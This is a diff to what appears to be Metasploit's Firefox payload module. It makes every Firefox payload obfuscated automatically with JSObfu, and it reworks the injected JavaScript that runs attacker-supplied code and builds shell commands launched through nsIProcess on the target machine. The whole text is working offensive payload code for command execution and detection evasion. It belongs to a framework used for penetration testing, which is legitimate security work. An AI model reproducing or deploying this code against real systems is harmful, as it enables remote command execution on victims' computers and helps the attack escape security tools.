@@ -1,8 +1,12 @@
 # -*- coding: binary -*-
 require 'msf/core'
+require 'msf/core/exploit/jsobfu'
 require 'json'
 
 module Msf::Payload::Firefox
+
+  # automatically obfuscate every Firefox payload
+  include Msf::Exploit::JSObfu
 
   # Javascript source code of setTimeout(fn, delay)
   # @return [String] javascript source code that exposes the setTimeout(fn, delay) method
@@ -121,14 +125,15 @@ module Msf::Payload::Firefox
           var retVal = null;
 
           try {
-            retVal = Function('send', js[1])(function(r){
+            this.send = function(r){
               if (sent) return;
               sent = true;
               if (r) {
                 if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
                 else      cb(false, r+tag+"\\n");
               }
-            });
+            };
+            retVal = Function(js[1]).call(this);
           } catch (e) { retVal = e.message; }
 
           sync = false;
@@ -169,12 +174,13 @@ module Msf::Payload::Firefox
           .get("TmpD", Components.interfaces.nsIFile);
         stdout.append(stdoutFile);
 
+        var shell;
         if (windows) {
-          var shell = shPath+" "+cmd;
+          shell = shPath+" "+cmd.trim();
           shell = shPath+" "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>&1";
           var b64 = svcs.btoa(shell);
         } else {
-          var shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
+          shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
           shell = shPath+" "+shell.replace(/\\W/g, shEsc) + " >"+stdout.path+" 2>&1";
         }
         var process = Components.classes["@mozilla.org/process/util;1"]
